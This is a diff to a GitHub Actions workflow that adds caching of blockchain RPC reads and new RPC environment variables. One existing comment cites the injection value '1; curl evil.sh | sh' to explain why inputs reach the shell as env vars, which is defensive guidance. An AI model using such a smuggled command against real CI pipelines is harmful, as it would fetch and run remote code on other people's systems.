@@ -82,6 +82,19 @@ jobs:
           DATABASE_URL: ${{ secrets.DATABASE_URL }}
           DATABASE_AUTH_TOKEN: ${{ secrets.DATABASE_AUTH_TOKEN }}
 
+      # Finalized chain reads (Transfer and factory log chunks) from earlier
+      # runs, so a token re-analysed today only asks the node for new blocks.
+      # Both lanes share one prefix: whichever ran last has the freshest set.
+      # Entries expire after RPC_CACHE_MAX_AGE_HOURS (default 7 days) and the
+      # directory is capped at 256 MB (packages/core/src/cache.ts).
+      - name: Restore chain-read cache
+        if: steps.cadence.outputs.due != 'false'
+        uses: actions/cache/restore@v4
+        with:
+          path: data/rpc-cache
+          key: rpc-cache-${{ github.run_id }}-${{ github.run_attempt }}
+          restore-keys: rpc-cache-
+
       # Inputs reach the shell as env vars, never as `${{ }}` inside the
       # script. Interpolation happens before bash sees the line, so a `limit` of
       # `1; curl evil.sh | sh` would have been pasted in as a command. They are
@@ -131,7 +144,10 @@ jobs:
           ETHERSCAN_API_KEY: ${{ secrets.ETHERSCAN_API_KEY }}
           RPC_ETHEREUM: ${{ secrets.RPC_ETHEREUM || vars.RPC_ETHEREUM }}
           RPC_SOLANA: ${{ secrets.RPC_SOLANA || vars.RPC_SOLANA }}
+          RPC_BASE: ${{ secrets.RPC_BASE || vars.RPC_BASE }}
           RPC_PUBLIC_FALLBACK: ${{ vars.RPC_PUBLIC_FALLBACK }}
+          RPC_CACHE: ${{ vars.RPC_CACHE }}
+          RPC_CACHE_MAX_AGE_HOURS: ${{ vars.RPC_CACHE_MAX_AGE_HOURS }}
           # Exa: the search tool for Kimi and other non-Anthropic models, and
           # how DexTools pairs are found (no browser)
           EXA_API_KEY: ${{ secrets.EXA_API_KEY }}
@@ -163,6 +179,14 @@ jobs:
           LAUNCHES_MIN_HOLDERS: ${{ vars.LAUNCHES_MIN_HOLDERS }}
           LAUNCHES_RESEARCH_ANCHORED: ${{ vars.LAUNCHES_RESEARCH_ANCHORED }}
           LOG_LEVEL: ${{ vars.LOG_LEVEL }}
+
+      # Saved even when the run fails: the chunks it did fetch are still final.
+      - name: Save chain-read cache
+        if: always() && steps.cadence.outputs.due != 'false' && hashFiles('data/rpc-cache/**') != ''
+        uses: actions/cache/save@v4
+        with:
+          path: data/rpc-cache
+          key: rpc-cache-${{ github.run_id }}-${{ github.run_attempt }}
 
       # Uploaded even on failure: a failed run's log is the only record of why.
       - name: Upload run artifacts
